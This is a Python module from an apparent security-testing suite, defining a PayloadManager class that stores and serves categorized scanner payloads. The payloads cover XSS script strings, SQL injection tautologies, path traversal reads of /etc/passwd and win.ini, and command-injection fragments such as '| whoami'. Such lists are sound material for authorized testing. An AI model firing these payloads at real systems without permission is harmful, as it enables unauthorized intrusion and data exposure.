# ============================================================
# File Name : payload_manager.py
# Project   : CyberSecuritySuite
# Author    : Gull Virk
# Version   : 1.0.0
#
# Description:
# Payload Manager Module:
# - Stores security test payloads
# - Categorizes payload types
# - Provides payload lists for scanners
# - Used in active testing modules
# ============================================================


class PayloadManager:

    def __init__(self):
        self.payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "'><img src=x onerror=alert(1)>"
            ],
            "sqli": [
                "' OR '1'='1",
                "';--",
                "\" OR \"1\"=\"1",
                "admin' --"
            ],
            "lfi": [
                "../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "/etc/passwd"
            ],
            "command_injection": [
                "; ls",
                "| whoami",
                "&& id"
            ]
        }

    # ========================================================
    # GET ALL CATEGORIES
    # ========================================================
    def get_categories(self):
        return list(self.payloads.keys())

    # ========================================================
    # GET PAYLOADS BY TYPE
    # ========================================================
    def get_payloads(self, category: str):
        return self.payloads.get(category.lower(), [])

    # ========================================================
    # ADD NEW PAYLOAD
    # ========================================================
    def add_payload(self, category: str, payload: str):
        category = category.lower()

        if category not in self.payloads:
            self.payloads[category] = []

        self.payloads[category].append(payload)

    # ========================================================
    # REMOVE PAYLOAD
    # ========================================================
    def remove_payload(self, category: str, payload: str):
        category = category.lower()

        if category in self.payloads and payload in self.payloads[category]:
            self.payloads[category].remove(payload)

    # ========================================================
    # SEARCH PAYLOAD
    # ========================================================
    def search(self, keyword: str):
        results = {}

        for category, items in self.payloads.items():
            matched = [p for p in items if keyword.lower() in p.lower()]

            if matched:
                results[category] = matched

        return results

    # ========================================================
    # PRINT ALL PAYLOADS
    # ========================================================
    def print_all(self):
        print("\n========== PAYLOAD LIST ==========")

        for category, items in self.payloads.items():
            print(f"\n[{category.upper()}]")

            for item in items:
                print(f" - {item}")

        print("\n==================================\n")


# ============================================================
# TEST RUN
# ============================================================
if __name__ == "__main__":

    pm = PayloadManager()

    pm.print_all()

    print("\nCategories:", pm.get_categories())

    print("\nXSS Payloads:", pm.get_payloads("xss"))